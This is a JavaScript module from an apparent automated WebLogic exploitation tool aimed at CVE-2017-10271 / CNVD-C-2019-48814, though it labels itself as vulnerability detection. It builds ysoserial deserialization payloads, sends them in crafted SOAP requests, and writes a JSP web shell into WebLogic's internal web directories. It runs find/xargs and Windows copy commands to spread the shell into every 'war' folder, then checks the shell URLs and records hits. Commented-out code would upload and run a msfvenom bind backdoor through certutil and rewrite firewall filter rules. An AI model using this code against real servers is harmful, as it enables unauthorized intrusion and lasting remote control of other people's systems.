module.exports={
  tags:"weblogic,10271_2",
  dependencies:"payload/[x.jsp],java,ysoserial",
	"ID":"030109",
  des:"CNVD-C-2019-48814,48814 Vulnerability detection",

  szXmlHd:'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">',
  szXmlEd:'</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>',
  fnCheckWebShell:function(xUrl,fnCbk2,cmd)
  {
    // var szRunAl = `sed --silent -i --follow-symlinks 's/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter>.*/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter><connection-filter-rule>192\.168\.28\.123 \* \* allow t3 t3s<\/connection-filter-rule>/g' config.xml>config.xml.bak;mv config.xml.bak config.xml`;
    var _t = this,_s = this.self,hst = _s.parseUrl(xUrl);
    if(_t.oUrls[xUrl])return;
    _s.log("check " + xUrl);
    var oOpt = _s.fnOptHeader({
      method: 'POST',
      timeout:7000,
      uri: xUrl
        ,headers:
        {
          "Host":hst.host,
          "User-Agent": "Mozilla/5.0 (windows; U; Intel 18; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
          "Accept-Encoding":"zh-CN,zh"
        }});
    if(cmd)
    {
      oOpt.uri = oOpt.uri.replace(/\?([^=]+)=.*$/gmi,"");
      oOpt.body = xUrl.replace(/(^.*?\?)|(=.*?$)/gmi,"") + encodeURIComponent(cmd);
      // console.log(oOpt.body)
      oOpt.headers["content-type"] = "application/x-www-form-urlencoded";
    }
    _s.request(oOpt,function(e,r,b)
    {
      if(_t.oUrls[xUrl])return;
      if(e)return _s.error(e,xUrl);
      var szRk = "ip:"
      // _s.log("curl '" + xUrl + "'");
      b = String(b);
      // console.log( b);
      // "Not Found;302 Moved Temporarily"
      var hvIp = -1 < b.indexOf(szRk);
      if(fnCbk2)fnCbk2(hvIp);
      if(hvIp)
      {
        _s.emit('jspShell',xUrl, _t);
        try{_s.oUrls[xUrl]=1;}catch(e){}
        // console.log(b);
        b = b.replace(/(^\s*)|(\s*$)/gmi,'');
        _s.log("curl '" + xUrl + "'");
        _s.log(b);
        _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
      }
      else
      {
        if(-1 == String(b).indexOf("404--Not Found"))
          _s.log("get: " + xUrl + "\n" + b);
      }
      return;
    });
  },
  uploadPayload:function(fileName,code,url,fnCbk)
  {
    if(true)return;
    var _t = this,_s = this.self;
    var s = _s.fnMyHelp(function(){
/*
<java version="1.4" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
        <string>{fileName}</string><void method="println">
          <string><![CDATA[{code}]]></string></void><void method="close"/>
    </object>
</java>

*/});
    s = s.replace(/\{fileName\}/gmi, fileName).replace(/\{code\}/gmi, code);
    _t.sendPayload(url,s,null,function(e,r,b)
    {
      // 似乎判断<faultstring>不准确
      if(e)_s.error(e);
      // console.log(url);console.log(e);
      // console.log(e||b)
       if(r && 202 == r.statusCode||-1 < String(b).indexOf("<faultstring>"))
       {
          fnCbk(fileName,url);
       }
    });
  },
  mkPayload:function(cmd)
  {
    // console.log(cmd)
    var _t = this, _s = this.self,
        szPay = _s.child_process.execSync("java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 '" + cmd + "'"),a = [];
    var i = 0;
    while(i < szPay.length)
    {
      try{
        var xx = szPay.readInt8(i);
        // console.log(xx);
        a.push("<void index=\"" + i + "\"><byte>" + xx  + "</byte></void>");
        i++;
      }
      catch(e){break;}
    }   
    return ' <array class="byte" length="' + szPay.length + '">' + a.join("") + "</array>";

  },
  cmdPayload:function(url,osBash,cmd,fnCbk)
  {
    var _t = this,_s = this.self,szPay = _t.mkPayload(cmd);
    // console.log(cmd)
    var s1_ = `<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>${szPay}</void></class></java>`;

    var bType = -1 < osBash.indexOf("cmd"),sB = bType ? "cmd.exe" : "/bin/bash";
    s1_ = s1_.replace(/\{bash\}/gmi,sB).replace(/\{c\}/gmi, bType?"/c":"-c").replace(/\{code\}/gmi, cmd);
    
    // console.log(url)
    _t.sendPayload(url,s1_,{timeout:10000},function(e,r,b)
    {
      
       if(r && 202 == r.statusCode|| -1 < String(b).indexOf("<faultstring>"))
       {
          if(fnCbk)fnCbk('',url);
       }
    });
  },
  g_nCnt:new Date().getTime(),
  sendPayload:function(url, szPayload, opt, fnCbk)
  {
    szPayload = this.szXmlHd + szPayload + this.szXmlEd;
  
    // console.log(url)
    var _t = this,_s = this.self;
    // 保存payload
    // _s.fs.writeFileSync(++_t.g_nCnt + ".xml", szPayload);
    var hst = _s.parseUrl(url);

    var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            // timeout:5000,
            body:szPayload
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
                "accept-encoding":"gzip, deflate",
                'x-forwarded-for': "127.0.0.1",
                'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                'accept-language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                'cache-control': "no-cache",
                "content-type":"text/xml"
              }});
    if(opt)
    {
      for(var k in opt)
      {
        if(opt[k])oOpt[k]= opt[k];
      }
      
    }
    _s.request(oOpt, fnCbk);
  },
  oUrls:{},
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
   
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,bBreakFor1 = false,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/RegistrationRequesterPortType11'.split(',');
/*
1、timebase
2、run
3、upload file
*/
  var oCTmp = _s.getX11_linuxShell("{code}"), s1_1 = oCTmp.c;
        szJspName = oCTmp.j;
    var szPay = _t.mkPayload(s1_1);
    console.log(szJspName)
    var s = `<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>${szPay}</void></class></java>`;
// console.log(s)
    var oUrls =_t.oUrls,szRk = "ip:", g_nFlg = 0, szJspName = "X11.jsp",fnTmp1,ks5;
    var bBreakFor = false,hst = _s.parseUrl(url);

		var nNum = new Date().getTime()/1000,nTime = 0,fCbk = function(b,r,e,u,fnCbk2)
     {
        // _s.log("check all " + u)
        // 验证
        if(-1 < u.indexOf('/wls-wsat/')||-1 < u.indexOf('/bea_wls_internal/'))
        {
          var aT = "bea_wls_cluster_internal;cloudstore;bea_wls_internal;wls-wsat;bea_wls_deployment_internal;bea_wls_management_internal2;consoleapp;uddiexplorer;uddi".split(/;/);
          bBreakFor = false;
          var fnFor = function(xUrl)
            {
              if(oUrls[xUrl])
              {
                _s.log("已经验、跳过、证过 " + xUrl)
                return;
              }
              _s.log("test:\n curl '" + xUrl + "'");
              // console.log("start " + xUrl);
              // _s.fnGetRequest(_s.request,{timeout:1000})
              _s.log("test " + xUrl);
              _s.request.get({uri:xUrl,timeout:20000},function(e,r,b)
              {
                if(oUrls[xUrl])return;
                if(e || !b)
                {
                    _s.log(xUrl + " " + e.toString());
                  return;
                }
                
                console.log("curl '" + xUrl + "'");//_s.log
                b = String(b);
                // console.log( b);
                // "Not Found;302 Moved Temporarily"
                var hvIp = -1 < b.indexOf(szRk);
                if(fnCbk2)fnCbk2(hvIp);
                if(hvIp)
                {
                  _s.emit('jspShell',xUrl, _t);
                  oUrls[xUrl]=1;
                  j = 10000;aT = [];bBreakFor=true; // break for
                  // console.log("停止： " + xUrl + "\n" + b);
                  b = b.replace(/(^\s*)|(\s*$)/gmi,'');
                  _s.log("Ok:\ncurl '" + xUrl + "'");
                  if(b)_s.log(b);
                  _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
                  fnCbk({});
                }
                else if(-1 == String(b).indexOf("Not Found"))
                {
                  _s.log("get: " + xUrl + "\n" + b);
                }
                return;
              });
            };
          for(var j = 0; j < aT.length; j++)
          {
            if(bBreakFor)break;
            (function(xxU){
              // _s.log(u + "\n======\n" + u.replace(/(wls\-wsat)|(bea_wls_internal)/gmi, xxU));
              fnFor(u.replace(/(wls\-wsat)|(bea_wls_internal)/gmi, xxU));  
            })(aT[j]);
          }
        }
     };
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s5;
    // console.log(s);
    // console.log(hst);
    
    var szTmpUrl = [hst.protocol,"//", hst.host,"/bea_wls_internal/",szJspName,""].join("");
    fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl,fnCbk2)
        {
           // console.log("fnTmp1")
           s = szPld||s;
          //  console.log(s)
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           var url1 = szOld.substr(0, szOld.indexOf('/',13));
           url = url1 + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = {timeout: nTime + 80000};
          // console.log(szPld||s)
          _t.sendPayload(url,szPld||s, oOpt, function (error, response, body)
          {
              _s.log(body)
              if(fnTmpCbk){fnTmpCbk(body,response,error,url1 + szTUrl,fnCbk2);return;}
              body = String(body || response && response.statusCode || error||"");
              if(-1 < body.indexOf("Error: ESOCKETTIMEDOUT"))
                {
                  // _t.fnCheckWebShell(szTmpUrl);
                  // console.log(szTmpUrl)
                  body = "ESOCKETTIMEDOUT",error=null;
                }
              if(error)_s.error(error);
              console.log(body)
              // if(response && response.statusCode != 202)
              // {
              //   // console.log(this.href);
              //   // _s.log("没有发现WebLogic CNVD-C-2019-48814 反序列化，response.statusCode："  + response.statusCode + response.body);
              //   return;
              // }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);
              // console.log(response.headers);
              // _s.log(body);
              if(nT >= nT2 || response )
              {
                var r = {vul:true,"body":String(body),href:_t.href||'',"url":szOld,"send":s,"des":
                  "发现高危漏洞 WebLogic CNVD-C-2019-48814 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r && r.vul)
                {
                   bBreakFor1 = true;
                   
                   if(global.X11){return fnCbk({},_t);}// 确保只执行一次
                   else
                   {
                       global.X11=true;

                       // 先发通杀win、linux的payloa
                       _s.log("send payload: win or linux ,web shell to servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName);
                       var szUrl = [hst.protocol,"//", hst.host,aPath[0]].join(""), ckCbk = null,
                           szJspPayload = _s.fs.readFileSync("payload/x.jsp").toString("utf-8");
                       _t.uploadPayload("servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName,
                          szJspPayload,szUrl,ckCbk = function()
                      {
                        _s.log("check xxx " + szTmpUrl);
                        _t.fnCheckWebShell(szTmpUrl);
                        // fCbk('','','',ssT);
                      });

                       // 还要拷贝后才能验证
                       _s.log("send payload: win or linux ,web shell ./" + szJspName);
                       _t.uploadPayload(szJspName, szJspPayload,szUrl,function(){
                          var fnCbktmp = function()
                          {
                            fCbk('','','',szTmpUrl);
                          };
                          
                          // var szBash = "find / -type d -name 'war' 2>/dev/null|xargs -I K cp -f " + szJspName +  " K/ta/417.jsp";
                          var szBash = "find / -type d -name 'war' 2>/dev/null|xargs -I K cp -f " + szJspName +  " K/" + szJspName;

                          // _s.log("send payload: linux ,run: " + szBash);
                          _t.cmdPayload(szUrl,'/bin/bash', szBash,fnCbktmp);
                          szBash = "for /f %i in ('dir /s /b war') do copy /y " + szJspName + " %i\\" + szJspName;
                          // szBash = "for /f %i in ('dir /s /b war') do copy /y " + szJspName + " %i\\ta\\417.jsp";
                          
                          // _s.log("send payload: win ,run: " + szBash);
                          _t.cmdPayload(szUrl,'cmd.exe', szBash,fnCbktmp);
                       });

                       // win 后渗透，暂且注释
                      //  _s.log("msfvenom genarate noWWW_P65533.exe,send payload: win exe2txt ./noWWW_P65533.exe");
                      //  _s.child_process.execSync(_s.config.noWwwBind.win);
                      //  if(_s.fs.existsSync("payload/noWWW_P65533.exe"))
                      //  _t.uploadPayload("noWWW_P65533.txt",
                      //     szJspPayload = _s.fs.readFileSync("payload/noWWW_P65533.exe").toString("base64"),szUrl,ckCbk = function()
                      // {
                      //     _s.log("send payload: win ,run noWWW_P65533");
                      //     _t.cmdPayload(szUrl,'cmd.exe', "certutil -decode noWWW_P65533.txt noWWW_P65533.exe",function()
                      //     {
                      //       _s.log("decode out noWWW_P65533.exe");
                      //       _t.cmdPayload(szUrl,'cmd.exe', "noWWW_P65533.exe",function()
                      //       {
                      //         _s.log("check noWWW_P65533.exe");
                      //         _s.log("check xxx " + szTmpUrl);
                      //         _t.fnCheckWebShell(szTmpUrl.replace(/whoami/gmi, "netstat -anto|findstr \":65533\""));
                      //       });
                      //     });
                      // });

                       // _s.log([oCTmp.c,szJspName]);
                      _s.log("send payload: linux, bash make all war/" + szJspName);
                      _t.cmdPayload(szUrl,'/bin/bash',s1_1,function()
                      {
                        fCbk('','','',szTmpUrl);
                      });

                       // fnTmp1(aPath[0],s = s1_1,fCbk,"/wls-wsat/" + szJspName);
                   }
                }
                fnCbk(r,_t);
                r = null;
              }
              else
              {
                var szTmp = String(body||"").trim();
                szTmp = "undefined" == szTmp ? "":szTmp;
                // if(response && 202 == response.statusCode)
                {
                  try{
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/bea_wls_internal/${szJspName}`).toString());
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/uddiexplorer/${szJspName}`).toString());
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/_async/${szJspName}`).toString());
                  }catch(e){}
                }
                // else _s.log("2、没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + szTmp);
              }
              //_s.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      if(bBreakFor1)break;
      fnTmp1(aPath[i]);
    }
	}
};
